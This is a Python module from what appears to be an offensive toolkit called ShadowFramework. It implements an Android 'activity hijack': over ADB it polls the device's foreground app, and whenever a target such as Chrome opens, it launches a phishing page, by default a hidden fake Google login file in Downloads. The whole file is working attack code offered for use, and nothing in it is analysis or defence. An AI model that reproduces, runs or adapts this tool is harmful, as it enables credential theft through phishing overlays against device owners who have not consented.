"""
ShadowFramework — Android Activity Hijack
Monitors foreground app and launches phishing overlay when target app opens.
"""
import subprocess
import time
import threading
from rich.console import Console
from utils.logger import log_action

console = Console()

def _adb(dev, *args, timeout=10):
    cmd = ['adb', '-s', dev] + list(args)
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip(), r.stderr.strip(), r.returncode
    except subprocess.TimeoutExpired:
        return '', 'timeout', 1


class Module:
    MODULE_INFO = {
        'name': 'post/android/activity_hijack',
        'description': 'Monitors foreground app via ADB and launches attacker activity when target app is detected.',
        'options': {
            'DEVICE_ID': 'Target device serial',
            'TARGET_PKG': 'Package to hijack (e.g. com.android.chrome) [default: com.android.chrome]',
            'HIJACK_URL': 'URL/file to launch as overlay [default: file:///sdcard/Download/.google_login.html]',
            'POLL_INTERVAL': 'Check interval in seconds [default: 2]',
            'DURATION': 'How long to monitor in seconds (0=until Ctrl-C) [default: 60]',
        }
    }

    def __init__(self, framework):
        self.framework = framework
        self._stop = False
        self._hijacked = False

    def _get_foreground_pkg(self, device_id):
        """Get the currently focused app package."""
        # Method 1: dumpsys window
        out, _, _ = _adb(device_id, 'shell', 'dumpsys', 'window', 'windows')
        for line in out.splitlines():
            if 'mCurrentFocus' in line or 'mFocusedApp' in line:
                # Extract package from "com.package/Activity"
                if '/' in line:
                    parts = line.split()
                    for p in parts:
                        if '/' in p and '.' in p:
                            return p.split('/')[0].rstrip('}')
        
        # Method 2: dumpsys activity
        out, _, _ = _adb(device_id, 'shell', 'dumpsys', 'activity', 'recents')
        for line in out.splitlines():
            if 'Recent #0' in line or 'realActivity=' in line:
                if '/' in line:
                    for part in line.split():
                        if '/' in part and '.' in part:
                            return part.split('/')[0].replace('realActivity=', '')
        return None

    def _launch_hijack(self, device_id, url):
        """Launch hijack overlay."""
        if url.startswith('http') or url.startswith('file:'):
            _adb(device_id, 'shell', 'am', 'start', '-a', 'android.intent.action.VIEW',
                 '-d', url, '-f', '0x10000000')  # FLAG_ACTIVITY_NEW_TASK
        else:
            # Launch as activity
            _adb(device_id, 'shell', 'am', 'start', '-n', url, '-f', '0x10000000')

    def _monitor(self, device_id, target_pkg, hijack_url, poll_interval, duration):
        """Monitor foreground app and hijack when target is detected."""
        start = time.time()
        triggers = 0
        
        while not self._stop:
            if duration > 0 and (time.time() - start) > duration:
                break

            current = self._get_foreground_pkg(device_id)
            
            if current and target_pkg in current:
                if not self._hijacked:
                    console.print(f"[bold red][!] Target detected: {current} → Launching hijack![/bold red]")
                    self._launch_hijack(device_id, hijack_url)
                    self._hijacked = True
                    triggers += 1
                    log_action(f"Activity hijack triggered on {current}")
            else:
                self._hijacked = False  # Reset when user leaves target app

            time.sleep(poll_interval)

        return triggers

    def run(self):
        device_id = self.framework.options.get('DEVICE_ID', '')
        target_pkg = self.framework.options.get('TARGET_PKG', 'com.android.chrome')
        hijack_url = self.framework.options.get('HIJACK_URL', 'file:///sdcard/Download/.google_login.html')
        poll_interval = float(self.framework.options.get('POLL_INTERVAL', '2'))
        duration = int(self.framework.options.get('DURATION', '60'))

        if not device_id:
            out, _, _ = _adb('', 'devices')
            for line in out.splitlines()[1:]:
                if '\tdevice' in line:
                    device_id = line.split('\t')[0]
                    break
        if not device_id:
            console.print("[red][!] No device found.[/red]")
            return

        console.print(f"[cyan][*] Activity Hijack monitor on {device_id}[/cyan]")
        console.print(f"    Target: [yellow]{target_pkg}[/yellow]")
        console.print(f"    Hijack URL: [dim]{hijack_url}[/dim]")
        console.print(f"    Duration: [dim]{duration}s (0=infinite)[/dim]")
        log_action(f"Activity hijack: monitoring {target_pkg} on {device_id}")

        # Verify target exists
        pkg_check, _, _ = _adb(device_id, 'shell', 'pm', 'list', 'packages', target_pkg)
        if target_pkg not in pkg_check:
            console.print(f"[yellow][!] Package {target_pkg} not installed on device.[/yellow]")

        console.print(f"\n[yellow][*] Monitoring... (Ctrl-C to stop)[/yellow]")
        
        try:
            triggers = self._monitor(device_id, target_pkg, hijack_url, poll_interval, duration)
        except KeyboardInterrupt:
            self._stop = True
            console.print("\n[yellow][*] Monitor stopped.[/yellow]")
            triggers = 0

        console.print(f"\n[bold green][+] Activity hijack complete. Triggered {triggers} times.[/bold green]")
